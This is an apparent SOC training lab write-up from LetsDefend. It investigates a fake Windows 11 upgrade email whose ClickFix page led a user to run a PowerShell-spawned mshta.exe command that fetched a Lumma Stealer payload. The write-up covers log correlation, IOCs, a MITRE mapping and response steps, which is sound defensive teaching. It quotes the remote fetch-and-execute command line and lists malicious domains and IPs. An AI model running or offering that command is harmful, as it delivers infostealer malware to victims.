# SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing

**Platform:** LetsDefend (SOC Simulator)
**Analyst:** Ali Elkhalifa
**Date solved:** 2026-10-08
**Severity:** Critical
**Difficulty:** Medium
**Verdict:** ✅ True Positive (host compromised)

---

## 1. Alert Overview

| Field | Value |
|---|---|
| EventID | 316 |
| Event Time | 2025-03-13 09:44:00 (+03:00) |
| Rule | SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing |
| Alert Type | Data Leakage |
| SMTP Address | 132.232.40.201 |
| Sender | update@windows-update.site |
| Recipient | dylan@letsdefend.io |
| Subject | Upgrade your system to Windows 11 Pro for FREE |
| Device Action | Allowed |
| Trigger Reason | Redirected site contains a ClickFix-type script for Lumma Stealer distribution |

**What is Lumma Stealer?** An infostealer that steals saved browser passwords, cookies, session tokens and crypto wallet data.

**What is ClickFix?** A social engineering technique where a fake web page tells the victim to "verify" or "fix" something by pressing `Win + R`, then `Ctrl + V`, then `Enter`. The page has silently copied a malicious PowerShell command to the clipboard, so the victim runs the malware themselves.

---

## 2. Investigation

### Step 1 - Email Analysis (Email Security)

The email was found in Email Security and was **delivered** to the user (Final Action: Allowed).

Red flags identified:
- **Fake sender domain:** `windows-update.site` is not a Microsoft domain. Microsoft does not deliver Windows upgrades by email.
- **Brand impersonation:** Microsoft logo, "Windows 11 Pro", "Support / For business" to look official.
- **Lure:** free upgrade offer.
- **Urgency:** countdown timer ("4 Day, 23 Hours, 59 Mins before the action ends") to pressure the user into acting quickly.
- **Repeated call to action:** "UPDATE NOW" appears 4 times, all linking to `https://www.windows-update.site`.
- **No attachment:** the attack relies only on the malicious URL.

> ⏱️ Note: Email Security displayed the time as `08:44:00`, while the alert showed `09:44:00+03:00`. Same event, different time zone display. Always normalize time zones when correlating between tools.

### Step 2 - URL Analysis (VirusTotal)

`https://www.windows-update.site/` → **10/93** vendors flagged it as Malware / Phishing / Malicious (including Kaspersky, BitDefender, Sophos, Fortinet). Community score: -1.

> 💡 A low ratio does not mean "safe". New domains are often unknown to many engines. What matters is which reputable vendors flagged it, combined with the context of the email.

**Result: Malicious**

### Step 3 - Did the user access the URL? (Log Management / SIEM)

Search: `raw_log contains "windows-update.site"` → 2 events:

| Time | Source | Meaning |
|---|---|---|
| 2025-03-13 08:44:32 | Exchange | Mail server received the email (expected) |
| 2025-03-13 22:26:08 | Proxy | **Internal host accessed the phishing site** |

Proxy log details:

| Field | Value |
|---|---|
| source_address | 172.16.17.216 (internal / private IP) |
| destination_address | 132.232.40.201 (same IP that sent the email) |
| destination_port | 443 (HTTPS) |
| URL | https://windows-update.site/ |

> The same IP (`132.232.40.201`) both sent the phishing email and hosted the phishing site.

### Step 4 - Identify the host (Endpoint Security / EDR)

| Field | Value |
|---|---|
| Hostname | Dylan |
| IP Address | 172.16.17.216 |
| OS | Windows 10 (64-bit) |
| Primary User | Dylan |
| Type | Client |

✅ Confirmed: the host that accessed the phishing site belongs to the email recipient.

### Step 5 - Process Analysis (EDR - Processes)

Suspicious process at `2025-03-13 23:26:32` (EDR time zone, = 22:26:32 in proxy time):

| Field | Value |
|---|---|
| Process | powershell.exe (PID 7308) |
| Parent Process | powershell.exe 🚩 |
| Command Line | `"C:\Windows\system32\mshta.exe" https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` |

Analysis:
- **PowerShell spawning PowerShell** is suspicious and typical of a multi-stage loader.
- **mshta.exe** is a legitimate Windows binary that executes HTA files (HTML with executable code). Abusing it to run remote code is a **LOLBin** technique (Living Off the Land Binary), used to evade antivirus.
- **Masquerading:** the payload is named `maloy.mp4`, but mshta does not play videos. It executes code. The fake extension makes it look harmless in logs.
- `overcoatpassably.shop` is a **new domain**, different from the phishing site: this is the second-stage payload server.

This is consistent with the ClickFix technique: the user pasted and executed the malicious command.

### Step 6 - Did the host contact the payload server? (Log Management)

Search: `raw_log contains "overcoatpassably.shop"` → 1 event:

```
2025-03-13 22:26:20 | Firewall | 172.16.17.216:34211 → 172.67.139.19:443 | Action: Allowed, Process ID: 7284, Request URL: https://overcoatpassably.shop/Z8...
```

- The connection was **Allowed**, so the payload download most likely succeeded.
- `172.67.139.19` belongs to a Cloudflare range. Attackers often hide their real servers behind CDNs.

---

## 3. Attack Timeline

| Time (proxy/log time) | Event |
|---|---|
| 2025-03-13 08:44 | Phishing email delivered to dylan@letsdefend.io |
| 2025-03-13 22:26:08 | Dylan's host (172.16.17.216) accesses `https://windows-update.site/` |
| 2025-03-13 22:26:32 | powershell.exe executes `mshta.exe` with the payload URL (ClickFix executed) |
| 2025-03-13 22:26:20 – 22:26:32 | Host connects to `overcoatpassably.shop` (172.67.139.19:443) - Allowed |

**Only ~12 seconds** passed between visiting the phishing page and contacting the payload server. That is the time it took the user to press `Win + R`, `Ctrl + V`, `Enter`.

**Attack chain:**
Phishing email → user clicks link → ClickFix page → user runs pasted command → PowerShell → mshta.exe → payload download from `overcoatpassably.shop` → Lumma Stealer

---

## 4. Indicators of Compromise (IOCs)

| Type | Value | Description |
|---|---|---|
| IP | `132.232.40.201` | Phishing SMTP server and phishing site host |
| Email | `update@windows-update.site` | Phishing sender |
| Domain | `windows-update.site` | Phishing domain (ClickFix page) |
| URL | `https://windows-update.site/` | Phishing URL |
| Domain | `overcoatpassably.shop` | Payload / C2 domain |
| URL | `https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4` | Lumma Stealer payload (executed via mshta) |
| IP | `172.67.139.19` | Payload server IP (Cloudflare) |

---

## 5. MITRE ATT&CK Mapping

| Technique | Name | Evidence |
|---|---|---|
| T1566.002 | Phishing: Spearphishing Link | Email with malicious link |
| T1204.001 | User Execution: Malicious Link | User visited the phishing site |
| T1059.001 | Command and Scripting Interpreter: PowerShell | powershell.exe executed the ClickFix command |
| T1218.005 | System Binary Proxy Execution: Mshta | mshta.exe used to run remote payload |
| T1105 | Ingress Tool Transfer | Payload downloaded from overcoatpassably.shop |
| T1036 | Masquerading | Payload disguised as `.mp4` |
| T1027 | Obfuscated Files or Information | Listed in alert |
| T1574.002 | Hijack Execution Flow: DLL Side-Loading | Listed in alert (Lumma delivery method) |

---

## 6. Response Actions

**Taken:**
- ✅ Malicious email deleted from the user's mailbox
- ✅ Host `Dylan` (172.16.17.216) contained via EDR
- ✅ IOCs added to the case as artifacts

**Recommended:**
- Reset all of Dylan's credentials and revoke active sessions (infostealer: browser passwords and cookies are likely stolen)
- Block all IOCs on firewall, proxy, email gateway and DNS
- Hunt for the same email and IOCs across other mailboxes and hosts
- Reimage the host before returning it to the user
- Security awareness: never paste commands into Run / PowerShell from a website

---

## 7. Playbook Answers

| Question | Answer |
|---|---|
| Parse Email | Sent 2025-03-13 09:44, SMTP 132.232.40.201, sender update@windows-update.site, recipient dylan@letsdefend.io, suspicious content, no attachment |
| Attachment or URL? | Yes (URL) |
| Analyze URL | Malicious |
| Delete Email | Deleted |
| Someone opened the URL? | Opened |
| Containment | Host contained |
| Verdict | **True Positive** ✅ |

---

## 8. Lessons Learned

1. **Every IP, domain, URL or hash in an alert is an IOC** that needs to be investigated.
2. **Time zones differ between tools** (Email: 08:44, Alert: 09:44+03:00, Proxy: 22:26, EDR: 23:26). Normalize before building a timeline.
3. **Deleting the email is not enough.** Always check whether the user already clicked before the email was removed.
4. **Filtering is the core SIEM skill:** 3907 events → 2 events with one `raw_log contains` filter.
5. **Parent/child process relationships** reveal malicious behavior (powershell → powershell → mshta).
6. **Legitimate Windows tools can be abused (LOLBins).** A trusted binary name does not mean trusted activity.
7. **Correlate across sources:** Email → VirusTotal → Proxy → EDR → Firewall. One source alone is never the full story.
8. **Containment is not the end with infostealers.** Credentials must be reset because data may already be exfiltrated.
